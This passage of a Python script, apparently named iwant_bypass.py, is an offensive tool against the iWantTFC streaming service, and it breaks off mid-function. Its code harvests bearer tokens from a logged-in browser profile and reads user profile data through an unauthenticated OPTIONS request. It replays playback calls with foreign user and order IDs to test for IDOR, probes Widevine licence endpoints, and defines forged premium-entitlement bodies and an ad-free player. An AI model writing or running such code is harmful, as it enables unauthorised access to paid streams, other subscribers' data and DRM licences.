#!/usr/bin/env python3
# iwant_bypass.py - Windows single-file iWantTFC capture / grab / routes / mint / probe / chain / idor / player
#                     + EPS lane (entitlement middleware, querystring-qualified start)
#                     + GraphQL content probe (consumer/graphql) - the item lane that replaced /api/1.0
#                     + CDP attach mode (real Chrome, real Widevine CDM)
#                     + identity harvest (OPTIONS profile oracle + page storage)
#
# LANES
#   EPS lane    POST https://api.iwanttfc.com/entitlement/playback/start/<assetId>
#                 ?offline=false&country=<CC>&contentId=<assetId>&platform=<p>&subPlatform=<p>
#                 The middleware prefix /entitlement AND the query are both required.
#                 Bare /playback/start/<id> is the edge-only path - Akamai 403, not EPS.
#                 401 = EPS errorCode 06 = real denial.
#   ITEM lane   POST https://api.iwanttfc.com/consumer/graphql   (content metadata; /api/1.0/* is GONE)
#
# Widevine needs a real CDM. Playwright's default args include --disable-component-update,
# which blocks the Widevine component download and makes even a HEADED Chrome throw
# NotSupportedError. Two escapes: ignore those defaults, or run `chrome` and attach over CDP.
# With CDP attached and a logged-in profile the session cookie carries auth, so a short
# bearer no longer blocks anything - in-page fetches use credentials:'include'.
#
# The CORS allow list on the subs endpoint names exactly six custom headers, and the client
# string is x-iw-useragent (NOT x-iwant-useragent):
#   authorization,content-type,x-country-code,x-device-platform,x-device-subplatform,x-iw-useragent
#
#   chrome   -> launch your own Chrome with remote debugging; every later command attaches
#   login    -> open the profile, log in once, keep cookies
#   token    -> harvest the bearer out of the logged-in profile, VALIDATE it, report its TTL
#   ident    -> harvest identity from the OPTIONS profile oracle + page storage -> identity.json
#   uauth    -> harvest the legacy UserAuthentication token, cache it
#   gql      -> probe consumer/graphql for content metadata (mpds/kid)
#   api10    -> probe the dead /api/1.0/ lane, report what it does now
#   grab     -> dump page state (storage, cookies, globals, live API URLs) to grab.json
#   routes   -> grep the site's JS bundles for real API paths + surrounding source
#   capture  -> real Chrome (headed), records manifest + license + API chain + gated bodies
#   legacy   -> dead lane, kept for the error text
#   stream   -> dead lane live probe
#   licprobe -> try the license endpoint across every auth placement (none/query/header/cookie)
#   devices  -> list / delete registered devices (concurrency slot)
#   mint     -> replay playback/start in-page or plain HTTP (--http), with --uid/--order
#   probe    -> replay chain with no token, judged by FRESH REMINT
#   chain    -> replay with foreign uid/orderId substituted or inserted
#   idor     -> get-active-entitlements auth/IDOR matrix
#   ezdrm    -> anonymous license POST probe
#   report   -> single JSON artifact
#   replay   -> console (diagnostics)
#   play     -> LOCAL PLAYER (live-capable, ad-gate free)
#   plan     -> read-only entitlement report (plan, freemium, trial, quality, ads)
#   selftest -> offline invariants + unit suite; --live also remints and probes the CDN/DRM
#   doctor   -> environment + Widevine + bot-cookie + lane check
from __future__ import annotations
import argparse, base64, getpass, hashlib, json, os, re, subprocess, sys, threading, time, uuid, webbrowser
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, quote, unquote, urlsplit, parse_qs
import requests as http
from flask import Flask, Response, request

# Windows consoles default to cp1252; titles/emails can carry non-ASCII bytes.
for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(errors="replace")
    except (AttributeError, ValueError):
        pass

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
except ImportError:
    sync_playwright = None

S = "https://www.iwanttfc.com"
API = "https://api.iwanttfc.com"
SUBS = "https://api.iwanttfc.com/subs/api/subscription/get-active-entitlements"
GQL = "consumer/graphql"
GQL_URL = API + "/" + GQL
START = "/entitlement/playback/start/"
COUNTRY = os.environ.get("IWANT_COUNTRY") or "PH"
PLATFORM = os.environ.get("IWANT_PLATFORM") or "chrome"
START_PLATFORM = os.environ.get("IWANT_START_PLATFORM") or "web"
START_QS = ("?offline=false&country=" + COUNTRY + "&contentId={a}"
            "&platform=" + START_PLATFORM + "&subPlatform=" + PLATFORM)
PORT = 5057
SV = 21
HERE = Path(__file__).resolve().parent
SD = Path(os.environ.get("IWANT_SESSIONS") or (HERE / "sessions"))
PROFILE = Path(os.environ.get("IWANT_PROFILE") or (HERE / "chrome-profile"))
SHOTS = HERE / "shots"
READY = PROFILE / ".iwant_ready"
TOKENF = HERE / "token.txt"
ROUTESF = HERE / "routes.json"
GRABF = HERE / "grab.json"
TPLF = HERE / "start_template.json"
IDENTF = HERE / "identity.json"
DBGF = HERE / "sweep_debug.log"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36")
IWUA = ("Name=iWant; Version=1.0.0; Platform=Web; OSVersion=14.0.0 "
        "Model=Chrome; BuildType=debug Environment=development")
BH = {"accept": "application/json, text/plain, */*", "accept-language": "en-US,en;q=0.9",
      "content-type": "application/json", "origin": S, "referer": S + "/", "user-agent": UA,
      "x-country-code": COUNTRY, "x-device-platform": "web", "x-device-subplatform": PLATFORM,
      "x-iw-useragent": IWUA}
UD_HDRS = ("authorization,content-type,x-country-code,x-device-platform,"
           "x-device-subplatform,x-iw-useragent")
CHROME_CANDIDATES = [
    os.environ.get("CHROME_PATH", ""),
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
]
AD_PATTERNS = ("**securepubads.g.doubleclick.net/**", "**imasdk.googleapis.com/**",
               "**/pagead/**", "**googletagservices.com/**", "**/ad.doubleclick.net/**",
               "**/pubads.g.doubleclick.net/**")
HOST_RE = re.compile(r"(iwanttfc|abs-cbn|ezdrm|drmtoday|widevine)", re.I)
MPD_RE = re.compile(r"\.mpd(\?|$)", re.I)
LIC_RE = re.compile(r"(widevine-dash\.ezdrm\.com|/license|/wv|widevine|drmtoday)", re.I)
LIC_U = re.compile(r'"(https?://[^"\s]+(?:ezdrm|/license|/wv|widevine|drmtoday)[^"\s]*)"', re.I)
MPD_U = re.compile(r'"(https?://[^"\s]+\.mpd[^"\s]*)"', re.I)
SEG_RE = re.compile(r"\.(m4s|mp4|m4v|m4a|cmfv|cmfa|ts)(\?|$)", re.I)
TRAILER_RE = re.compile(r"iwant-trailer|/trailers?/|trailer[-_.]", re.I)
ASSET = re.compile(r"/player/([0-9a-f-]{36})", re.I)
EPS = re.compile(r"EPS-\d{3}-\d{2}", re.I)
EXP = re.compile(r"[?&]exp=(\d{9,11})")
UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I)
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")
ROUTE_RE = re.compile(r"(?:/?(?:entitlement|playback|subs|drm|content|catalog|asset|episode|movie|title|heartbeat|identity|watchlist|license|stream|media|user))/"
                      r"[A-Za-z0-9/_\-.${}:]{2,90}")
ROUTE_URL_RE = re.compile(r"https?://[a-z0-9.\-]*api\.iwanttfc\.com(/[A-Za-z0-9/_\-.<>{}:${}]{2,120})", re.I)
API10_RE = re.compile(r"/api/1\.0/[A-Za-z0-9/_\-]+")
API_BASE_RE = re.compile(r"https?://[a-z0-9.\-]*api\.iwanttfc\.com", re.I)
EPSPATH_RE = re.compile(r"(entitlement|playback|graphql|api/1\.0|subs)", re.I)
START_RE = re.compile(r"playback/start", re.I)
GQL_RE = re.compile(r"graphql", re.I)
EDGE_RE = re.compile(r"(Access Denied|edgesuite\.net|akamai|Reference&#32;#)", re.I)
LIVE_TXT = re.compile(r"livestream|live\s*(channel|stream|now)|watch\s*live", re.I)
AD_SKIP = (".ytp-ad-skip-button", ".videoAdUiSkipButton", "#skip-button",
           "button[class*=skip]", ".ima-ad-container button", "[id*=skip]")
ENT_KEYS = ("isEntitled", "entitled", "isEntitle", "entitlement", "entitlements",
            "isFreemium", "requiresSubscription", "subscriptionRequired",
            "accessLevel", "sku", "playbackAllowed", "canPlay", "playable")
OID_K = ("orderId", "entitlementId", "subscriptionId")
UID_K = ("userId", "uid", "customerId", "subscriberId")
CUST_K = ("customData", "customdata", "custom_data", "licenseCustomData",
          "widevineCustomData", "drmToken", "licenseToken", "playbackToken")
CHDR = ("x-dt-custom-data", "x-ezdrm-customdata", "customdata")
SUB_H = ("userId", "subscriptionType", "expiryDate", "isFreemium", "orderId")
BODY_KEYS = ("contentId", "assetId", "serviceId", "playbackSessionId", "episodeId",
             "movieId", "profileId", "deviceId", "orderId", "drmType", "streamType",
             "quality", "contentType", "countryCode", "userId")
GQL_KEYS = ("serviceId", "quality", "drmType", "countryCode", "subscriptionType", "isFreemium")
XML_ATTR = re.compile(r'(media|initialization|sourceURL|index)\s*=\s*"([^"]+)"')
XML_BASE = re.compile(r"<BaseURL>([^<]+)</BaseURL>")
XML_LOC = re.compile(r"<Location>([^<]+)</Location>")
DROP_REQ = ("host", "content-length", "accept-encoding", "connection")
CHROME_ARGS = ["--disable-blink-features=AutomationControlled",
               "--autoplay-policy=no-user-gesture-required",
               "--disable-features=CalculateNativeWinOcclusion"]
# Playwright defaults that strangle the Widevine component download
CDP_DROP = ["--disable-component-update", "--disable-extensions",
            "--disable-background-networking"]
SESSION_CANDIDATES = ["/entitlement/playback/session", "/entitlement/playback/sessions",
                      "/playback/session", "/playback/init",
                      "/entitlement/playback/init", "/playback/sessions"]
START_FALLBACKS = ["/entitlement/playback/start/<uuid>", "/playback/start/<uuid>"]
SID_KEYS = ("playbackSessionId", "sessionId", "playbackSession", "playbackId")
PREMIUM = {"isFreemium": False, "isPremium": True, "active": True, "status": "Active",
           "subscriptionType": "Premium", "plan": "PREMIUM", "displayName": "iWant PREMIUM Plan",
           "serviceId": "SVOD001", "serviceType": "SVOD", "retailPrice": 199,
           "isInFreeTrial": False, "isCancellable": True,
           "expiryDate": "2099-12-31T23:59:59Z", "expiresAt": "2099-12-31T23:59:59Z"}
PREMIUM_ENT = {"ads": False, "adsMidrolls": False, "download": True, "concurrentView": 4,
               "noDevice": 4, "quality": "uhd", "earlyAccess": True}
PREMIUM_BODY = {"serviceId": "SVOD001", "serviceType": "SVOD", "subscriptionType": "Premium",
                "isFreemium": False, "quality": "uhd", "drmType": "widevine",
                "streamType": "dash", "countryCode": COUNTRY,
                "isFree": False, "isFreeUser": False, "isEntitled": True, "entitled": True,
                "isSubscribed": True, "productType": "PAID", "entitlementType": "PAID"}

# ---------------------------------------------------------------- dead legacy lane (kept for the text)
LEGACY = "https://www.iwanttfc.com"
API10 = LEGACY + "/api/1.0"
LIC10 = API10 + "/license?itemID="
STR10 = API10 + "/stream?streamID="
LOGIN10 = API10 + "/user/login"
DEV10 = API10 + "/user/devices"
SETF = HERE / "legacy_uri.json"
UAF = HERE / "uauth.txt"
UA_H = "UserAuthentication"
LEG_H = {"x-requested-with": "XMLHttpRequest", "accept": "application/json, text/plain, */*"}
ITEM_FALLBACK = API10 + "/item?id=%s"
ITEM_PATHS = ["/api/1.0/item?id=%s", "/api/1.0/content?id=%s", "/api/1.0/media?id=%s",
              "/api/1.0/episode?id=%s", "/api/1.0/show?id=%s",
              "/api/1.0/item/%s", "/api/1.0/content/%s", "/api/1.0/episode/%s"]

# ---------------------------------------------------------------- graphql item probe
GQL_QUERIES = [
    ("query C($id:String!){content(id:$id){id title media{mpds{url kid}}}}", "content.media",
     {"id": None}),
    ("query I($id:String!){item(id:$id){id title media{mpds{url kid}}}}", "item.media",
     {"id": None}),
    ("query A($id:String!){asset(id:$id){id title media{mpds{url kid}}}}", "asset.media",
     {"id": None}),
    ("query E($id:String!){episode(id:$id){id title media{mpds{url kid}}}}", "episode.media",
     {"id": None}),
    ("{__typename}", "introspect", None),
]


def log(m, lvl=""):
    print(f"{ { 'e': '[!]', 'w': '[*]', 'g': '[+]'}.get(lvl, '[*]') } {m}", flush=True)


def clean(h, drop):
    return {k: v for k, v in (h or {}).items() if k.lower() not in drop}


def _n(v):
    return "" if v is None else str(v).strip()


def norm_lic(u):
    """Undo JSON escaping the capture kept literally; EZDRM query is &-joined."""
    return (_n(u).replace("\\u0026", "&").replace("\\/", "/").replace("&amp;", "&"))


def norm_mpd(u):
    return _n(u).replace("\\/", "/").replace("\\u0026", "&")


def _walk(x):
    if isinstance(x, dict):
        yield x
        for v in x.values():
            yield from _walk(v)
    elif isinstance(x, list):
        for v in x:
            yield from _walk(v)


def _path(u):
    return re.sub(r"^https?://[^/]+", "", (u or "").split("?")[0])


def _quality(u):
    m = re.search(r"manifest\.(\d+)x(\d+)\.mpd", u)
    return int(m.group(1)) * int(m.group(2)) if m else 0


def _jwt_claims(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}


def jwt_exp(tok):
    try:
        return float(_jwt_claims(tok).get("exp") or 0)
    except Exception:
        return 0.0


def lic_exp_from_url(u):
    """EZDRM puts a 2-minute JWT in CustomData; that exp is the real licence deadline."""
    try:
        q = parse_qs(urlsplit(norm_lic(u)).query)
        cd = (q.get("CustomData") or [""])[0]
        p = cd.split(".")[1]
        p += "=" * (-len(p) % 4)
        return float(json.loads(base64.urlsafe_b64decode(p)).get("exp") or 0)
    except Exception:
        return 0.0


def _uid_from_jwt(tok):
    c = _jwt_claims(tok or "")
    return _n(c.get("uid") or c.get("userId") or c.get("customerId") or c.get("sub"))


def _jwt_ids(tok):
    c = _jwt_claims(tok or "")
    return {"jwt_uid": _n(c.get("uid")), "jwt_sub": _n(c.get("sub"))}


def find_chrome():
    for c in CHROME_CANDIDATES:
        if c and Path(c).exists():
            return c
    return ""


# ---------------------------------------------------------------- CDP attach
CDP_PORT = int(os.environ.get("IWANT_CDP_PORT") or 9222)
CDP_URL = f"http://127.0.0.1:{CDP_PORT}"


def cdp_alive():
    try:
        return http.get(CDP_URL + "/json/version", timeout=2).status_code == 200
    except http.RequestException:
        return False


def open_real_chrome(exe="", url="about:blank", wait=25):
    """Launch the user's own Chrome with remote debugging. No Playwright arg set,
    so component updates (the Widevine CDM) are free to download."""
    if cdp_alive():
        log("CDP already listening - reusing the running Chrome", "g")
        return True
    exe = exe or find_chrome()
    if not exe:
        log("Chrome not found - set CHROME_PATH", "e")
        return False
    PROFILE.mkdir(parents=True, exist_ok=True)
    args = [exe,
            f"--remote-debugging-port={CDP_PORT}",
            f"--user-data-dir={PROFILE}",
            "--no-first-run", "--no-default-browser-check",
            "--disable-blink-features=AutomationControlled",
            "--autoplay-policy=no-user-gesture-required",
            "--disable-features=CalculateNativeWinOcclusion",
            url]
    try:
        subprocess.Popen(args,
                         creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
    except Exception as e:
        log(f"chrome launch failed ({e})", "e")
        return False
    for _ in range(wait * 4):
        if cdp_alive():
            log(f"CDP up on {CDP_PORT} - profile {PROFILE}", "g")
            return True
        time.sleep(0.25)
    log("CDP never came up - is another Chrome already holding that profile?", "e")
    return False


def close_ctx(ctx):
    """ctx.close() on a CDP context tears down the whole browser. Keep it alive."""
    if ST.get("cdp"):
        return
    try:
        ctx.close()
    except Exception:
        pass


def work_page(ctx):
    """A throwaway tab so a mid-capture harvest never navigates the player away.
    Returns (page, own) - close it yourself when own is True."""
    if ST.get("cdp") and ctx.pages:
        try:
            return ctx.new_page(), True
        except Exception:
            pass
    return (ctx.pages[0] if ctx.pages else ctx.new_page()), False


def open_url(url, exe=""):
    exe = exe or find_chrome()
    if exe:
        try:
            subprocess.Popen([exe, "--new-window",
                              "--autoplay-policy=no-user-gesture-required", url],
                             creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0))
            return True
        except Exception as e:
            log(f"chrome launch failed ({e})", "w")
    try:
        webbrowser.open(url)
        return True
    except Exception:
        return False


def launch_ctx(pw, headless, exe):
    if cdp_alive():
        b = pw.chromium.connect_over_cdp(CDP_URL)
        ST["cdp"] = True
        ST["browser"] = b
        ctx = b.contexts[0] if b.contexts else b.new_context()
        log("attached to real Chrome over CDP", "g")
        return ctx
    ST["cdp"] = False
    exe = exe or find_chrome()
    if not exe:
        sys.exit("Chrome not found - set CHROME_PATH or pass --exe")
    kw = {"headless": headless, "args": CHROME_ARGS, "executable_path": exe,
          "user_agent": UA, "locale": "en-US", "viewport": {"width": 1280, "height": 720},
          "ignore_default_args": CDP_DROP}
    PROFILE.mkdir(parents=True, exist_ok=True)
    return pw.chromium.launch_persistent_context(str(PROFILE), **kw)


def wv_check(exe, headless):
    """Widevine needs a real CDM; headless Chromium has none."""
    try:
        with sync_playwright() as pw2:
            ctx = launch_ctx(pw2, headless, exe)
            page, own = work_page(ctx)
            page.goto(S + "/", wait_until="domcontentloaded", timeout=45000)
            ok = page.evaluate("""(async()=>{try{
              await navigator.requestMediaKeySystemAccess('com.widevine.alpha',
                [{initDataTypes:['cenc'],videoCapabilities:[{contentType:'video/mp4;codecs="avc1.42E01E"'}]}]);
              return 'yes'}catch(e){return 'ERR:'+(e.name||e)}})()""")
            ck = page.evaluate("()=>document.cookie")
            if own:
                try:
                    page.close()
                except Exception:
                    pass
            else:
                close_ctx(ctx)
            return ok, ("_abck" in (ck or ""))
    except Exception as e:
        return f"launch error ({e})", False


@dataclass
class Session:
    schema_version: int = SV
    asset_id: str = ""
    player_url: str = ""
    is_live: bool = False
    bearer: str = ""
    mpd_url: str = ""
    mpd_headers: dict = field(default_factory=dict)
    license_url: str = ""
    license_headers: dict = field(default_factory=dict)
    license_method: str = "POST"
    license_content_type: str = "application/octet-stream"
    license_mode: str = "raw"
    license_body: str = ""
    license_custom_data: str = ""
    api_chain: list = field(default_factory=list)
    license_post_observed: bool = False
    license_resp_status: int = 0
    captured_at: float = 0.0
    mpd_exp: float = 0.0
    lic_ttl: float = 120.0
    lic_exp: float = 0.0
    widevine: bool = False
    blocked: str = ""
    note: str = ""
    trace: list = field(default_factory=list)
    observed: list = field(default_factory=list)
    ent: list = field(default_factory=list)
    identity: dict = field(default_factory=dict)
    uauth: str = ""
    media_id: str = ""
    stream_id: str = ""
    kid: str = ""
    mpds: list = field(default_factory=list)
    m3u8s: list = field(default_factory=list)
    license_auth: str = "header"
    item_url: str = ""
    country: str = COUNTRY
    platform: str = PLATFORM

    def mpd_left(self):
        return max(0.0, self.mpd_exp - time.time()) if self.mpd_exp else -1.0

    def lic_left(self):
        if self.lic_exp:
            return max(0.0, self.lic_exp - time.time())
        return -1.0 if not self.captured_at else max(0.0, (self.captured_at + self.lic_ttl) - time.time())


def save_sess(s):
    SD.mkdir(parents=True, exist_ok=True)
    tag = "live" if s.is_live else "vod"
    p = SD / f"{s.asset_id or 'capture'}-{tag}-{datetime.now():%Y%m%d-%H%M%S}.json"
    d = asdict(s)
    d["mpd_url"] = norm_mpd(d.get("mpd_url"))
    d["license_url"] = norm_lic(d.get("license_url"))
    p.write_text(json.dumps(d, indent=2), encoding="utf-8")
    return p


def load_sess(p):
    d = json.loads(Path(p).read_text(encoding="utf-8"))
    s = Session(**{k: v for k, v in d.items() if k in Session.__dataclass_fields__})
    s.mpd_url = norm_mpd(s.mpd_url)
    s.license_url = norm_lic(s.license_url)
    if s.license_url and not s.lic_exp:
        s.lic_exp = lic_exp_from_url(s.license_url)
    return s


def load_template():
    if not TPLF.exists():
        return {}
    try:
        return json.loads(TPLF.read_text(encoding="utf-8"))
    except Exception:
        return {}


def load_template_body():
    b = load_template().get("body") or {}
    if isinstance(b, str):
        try:
            return json.loads(b)
        except Exception:
            return {}
    return b if isinstance(b, dict) else {}


# ---------------------------------------------------------------- identity harvest
def _ud_parse(r, tag):
    try:
        d = r.json().get("data") or {}
    except ValueError:
        return None, f"{tag} {r.status_code} not json"
    if not isinstance(d, dict) or not d:
        return None, f"{tag} {r.status_code} no data"
    c = (d.get("contact") or [{}])[0] or {}
    return {"userId": _n(d.get("id")), "country": _n(d.get("country")),
            "loginType": _n(d.get("loginType")), "email": _n(c.get("email")),
            "firstName": _n(c.get("firstName")), "lastName": _n(c.get("lastName")),
            "verified": bool(d.get("verificationStatus")),
            "profileComplete": bool(d.get("isProfileComplete")),
            "source": "options"}, ""


def userdata(token=""):
    """OPTIONS on the subs endpoint hands back the profile record with no bearer.
    Falls back to the authenticated POST when the preflight is not JSON."""
    h = dict(BH)
    h["access-control-request-method"] = "POST"
    h["access-control-request-headers"] = UD_HDRS
    if token:
        h["authorization"] = f"Bearer {token}"
    try:
        r = http.options(SUBS, headers=h, timeout=20)
    except http.RequestException as e:
        return {}, str(e)
    rec, err = _ud_parse(r, "options")
    if rec:
        return rec, ""
    if token:
        hh = dict(BH)
        hh["authorization"] = f"Bearer {token}"
        try:
            r2 = http.post(SUBS, headers=hh, json={"userId": "", "includeTvod": False,
                                                   "includeAllActive": True}, timeout=20)
        except http.RequestException as e:
            return {}, f"{err}; post {e}"
        rec2, err2 = _ud_parse(r2, "post")
        if rec2:
            rec2["source"] = "subs"
            return rec2, ""
        return {}, f"{err}; {err2}"
    return {}, err


UD_SCAN_JS = """() => {
  const want = ['userid','uid','customerid','email','profile','account','subscriber','login'];
  const hits = {};
  const take = (st, tag) => { for (let i = 0; i < st.length; i++) {
    const k = st.key(i); if (!k) continue;
    if (!want.some(w => k.toLowerCase().includes(w))) continue;
    const v = st.getItem(k); if (v && v.length < 4000) hits[tag + ':' + k] = v; } };
  try { take(localStorage, 'ls'); } catch (e) {}
  try { take(sessionStorage, 'ss'); } catch (e) {}
  return hits;
}"""


def active_plan(token, uid=""):
    """What the account is actually entitled to; explains a flat EPS 401."""
    out = {"country": "", "plans": []}
    if not token:
        return out, "no bearer"
    h = dict(BH)
    h["authorization"] = f"Bearer {token}"
    try:
        r = http.post(SUBS, headers=h, json={"userId": uid or "", "includeTvod": False,
                                             "includeAllActive": False}, timeout=20)
        d = (r.json().get("data") or {})
    except (http.RequestException, ValueError) as e:
        return out, str(e)
    out["country"] = _n(d.get("country"))
    for x in (d.get("subscriptions") or []):
        e = x.get("entitlements") or {}
        out["plans"].append({"name": _n(x.get("displayName")),
                             "serviceId": _n(x.get("serviceId")),
                             "freemium": bool(x.get("isFreemium")),
                             "trial": bool(x.get("isInFreeTrial")),
                             "status": _n(x.get("status")),
                             "quality": _n(e.get("quality")),
                             "ads": bool(e.get("ads"))})
    return out, ""


def app_userdata():
    """Same labels from page storage and cookies, over the attached profile."""
    out = {"storage": {}, "cookies": {}, "source": "app"}
    if sync_playwright is None or not cdp_alive():
        return out
    try:
        with sync_playwright() as pw:
            ctx = launch_ctx(pw, True, "")
            page, own = work_page(ctx)
            if S not in (page.url or ""):
                try:
                    page.goto(S + "/", wait_until="domcontentloaded", timeout=45000)
                    page.wait_for_timeout(2000)
                except PWTimeout:
                    pass
            out["storage"] = page.evaluate(UD_SCAN_JS) or {}
            for c in ctx.cookies():
                if re.search(r"(user|uid|account|email|profile|login)", c.get("name") or "", re.I):
                    out["cookies"][c["name"]] = (c.get("value") or "")[:400]
            if own:
                try:
                    page.close()
                except Exception:
                    pass
            else:
                close_ctx(ctx)
    except Exception as e:
        out["error"] = str(e)
    return out


def collect_ident(token="", uid="", email=""):
    """Stored identity, then live oracle, then JWT uid, then subject. Persisted when resolved."""
    rec = {}
    if IDENTF.exists():
        try:
            rec.update(json.loads(IDENTF.read_text(encoding="utf-8")))
        except Exception:
            pass
    net, err = userdata(token)
    if net:
        rec.update({k: v for k, v in net.items() if v})
    elif err:
        log(f"userdata: {err}", "w")
    ids = _jwt_ids(token)
    if ids["jwt_uid"] or ids["jwt_sub"]:
        rec.update(ids)
    if (ids["jwt_uid"] and rec.get("userId")
            and rec["userId"] == ids["jwt_sub"]
            and rec.get("source") in ("", "jwt", "jwt-sub")):
        rec["userId"], rec["source"] = ids["jwt_uid"], "jwt-uid"
    if uid:
        rec["userId"], rec["source"] = uid, "flag"
    if email:
        rec["email"] = email
    if not rec.get("userId"):
        u = _uid_from_jwt(token)
        if u:
            rec["userId"] = u
            rec["source"] = "jwt-uid" if ids["jwt_uid"] else "jwt-sub"
    if rec.get("userId"):
        rec["userId"] = _n(rec["userId"])
        ju = rec.get("jwt_uid") or ""
        if ju and rec["userId"] != ju:
            rec["mismatch"] = {"identity": rec["userId"], "jwt_uid": ju,
                               "jwt_sub": rec.get("jwt_sub") or ""}
        else:
            rec.pop("mismatch", None)
        IDENTF.write_text(json.dumps(rec, indent=2), encoding="utf-8")
    return rec


def inject_body(body, ident):
    """Stamp harvested identity onto an envelope so it reads as a real client."""
    if not isinstance(body, dict) or not ident:
        return body
    b = dict(body)
    if ident.get("userId"):
        b["userId"] = ident["userId"]
    if ident.get("country"):
        b["countryCode"] = ident["country"]
    if ident.get("email"):
        b.setdefault("email", ident["email"])
    return b


# ---------------------------------------------------------------- token harvest
HARVEST_JS = """() => {
  const out = [];
  const scan = (o, tag) => {
    if (!o) return;
    for (const k of Object.keys(o)) {
      const v = o[k];
      if (typeof v === 'string' && /^eyJ[A-Za-z0-9_-]{10,}\\./.test(v)) out.push([tag, k, v]);
      else if (typeof v === 'string' && v.length < 4000 && /^[\\s]*[{\\[]/.test(v)) {
        try {
          const j = JSON.parse(v);
          for (const jk of Object.keys(j || {})) {
            const jv = j[jk];
            if (typeof jv === 'string' && /^eyJ[A-Za-z0-9_-]{10,}\\./.test(jv)) out.push([tag + '.' + k, jk, jv]);
          }
        } catch (e) {}
      }
    }
  };
  try { scan(localStorage, 'ls'); } catch (e) {}
  try { scan(sessionStorage, 'ss'); } catch (e) {}
  return out;
}"""


def _candidate_ok(tok):
    """A token is usable only if the API accepts it. Refresh tokens 403 everywhere."""
    h = dict(BH)
    h["authorization"] = f"Bearer {tok}"
    try:
        r = http.post(SUBS, headers=h, json={"userId": "", "includeTvod": False,
                                             "includeAllActive": True}, timeout=20)
    except http.RequestException:
        return False
    return r.status_code == 200


def _best(tok_list):
    seen, cands = set(), []
    for t in tok_list:
        if not t or t in seen:
            continue
        seen.add(t)
        c = _jwt_claims(t)
        if _n(c.get("token_use")).lower() == "refresh" or _n(c.get("typ")).lower() == "refresh":
            continue
        if not c.get("sub") and not c.get("uid"):
            continue
        cands.append(t)
    cands.sort(key=lambda t: (-jwt_exp(t), -len(t)))
    for t in cands[:4]:
        if _candidate_ok(t):
            log("token accepted", "g")
            return t, jwt_exp(t)
    if cands:
        log("no candidate authenticated - falling back to longest-lived", "w")
        return cands[0], jwt_exp(cands[0])
    return "", 0.0


def harvest(exe="", headless=True):
    """Harvest the bearer. Under CDP this runs in a throwaway tab so an in-flight
    capture is never navigated away from its player page."""
    if sync_playwright is None:
        return "", 0.0
    found = []
    try:
        with sync_playwright() as pw:
            ctx = launch_ctx(pw, headless, exe)
            page, own = work_page(ctx)
            try:
                page.goto(S + "/", wait_until="domcontentloaded", timeout=45000)
                page.wait_for_timeout(2500)
            except Exception:
                pass
            try:
                for _t, _k, v in (page.evaluate(HARVEST_JS) or []):
                    found.append(v)
            except Exception:
                pass
            try:
                for c in ctx.cookies():
                    if JWT_RE.search(c.get("value") or ""):
                        found.append(JWT_RE.search(c["value"]).group(0))
            except Exception:
                pass
            if own:
                try:
                    page.close()
                except Exception:
                    pass
            else:
                close_ctx(ctx)
    except SystemExit:
        raise
    except Exception as e:
        log(f"harvest error: {e}", "w")
    tok, exp = _best(found)
    if tok:
        TOKENF.write_text(json.dumps({"token": tok, "exp": exp,
                                      "at": datetime.now().isoformat(timespec="seconds")}),
                          encoding="utf-8")
    return tok, exp


def resolve_token(arg="", session=None, exe="", allow_harvest=True):
    if arg:
        return arg, jwt_exp(arg)
    if session and session.bearer:
        return session.bearer, jwt_exp(session.bearer)
    if TOKENF.exists():
        try:
            tok = json.loads(TOKENF.read_text(encoding="utf-8")).get("token") or ""
            if tok and jwt_exp(tok) > time.time() + 30 and _candidate_ok(tok):
                return tok, jwt_exp(tok)
            if tok:
                log("cached bearer rejected or expiring - re-harvesting", "w")
        except Exception:
            pass
    if allow_harvest:
        log("harvesting bearer from the logged-in profile ...")
        return harvest(exe)
    return "", 0.0


def report_ttl(tok, exp):
    if not tok:
        log("no bearer - mint will run unauthenticated", "w")
        return
    left = exp - time.time() if exp else -1
    if exp and left < 0:
        log(f"bearer EXPIRED {int(-left)}s ago - run: token", "e")
    elif exp and left < 180:
        log(f"bearer expires in {int(left)}s", "w")
    elif exp:
        log(f"bearer ok, {int(left // 60)}m left")
    else:
        log("bearer has no exp claim")


# ---------------------------------------------------------------- dead lane helpers
def uauth_headers(token="", mode="header"):
    h = dict(BH)
    h.update(LEG_H)
    if token:
        if mode == "cookie":
            h["cookie"] = f"{UA_H}={token}"
        elif mode != "query":
            h[UA_H] = token
    return h


BOOT = {"tried": False, "uri": {}}
DEADF = HERE / "api10_dead"


def legacy_bootstrap(refresh=False):
    if not refresh:
        if SETF.exists():
            try:
                return json.loads(SETF.read_text(encoding="utf-8"))
            except Exception:
                pass
        if BOOT["tried"]:
            return BOOT["uri"]
    BOOT["tried"] = True
    try:
        r = http.get(LEGACY + "/", headers=uauth_headers(), timeout=30)
    except http.RequestException as e:
        log(f"bootstrap: origin unreachable ({e})", "e")
        return BOOT["uri"]
    m = (re.search(r'<script[^>]+src="([^"]*catalog[^"]*script\.js[^"]*)"', r.text)
         or re.search(r'<script[^>]+src="([^"]+/c/6/[^"]+)"', r.text))
    if not m:
        log("bootstrap: no catalog script.js - lane is gone, /api/1.0/* is not served", "w")
        return BOOT["uri"]
    try:
        s = http.get(m.group(1), headers=uauth_headers(), timeout=30).text
    except http.RequestException as e:
        log(f"bootstrap: script fetch failed ({e})", "e")
        return BOOT["uri"]
    mm = re.search(r"var index = (\{[^\r\n]+\});", s)
    if not mm:
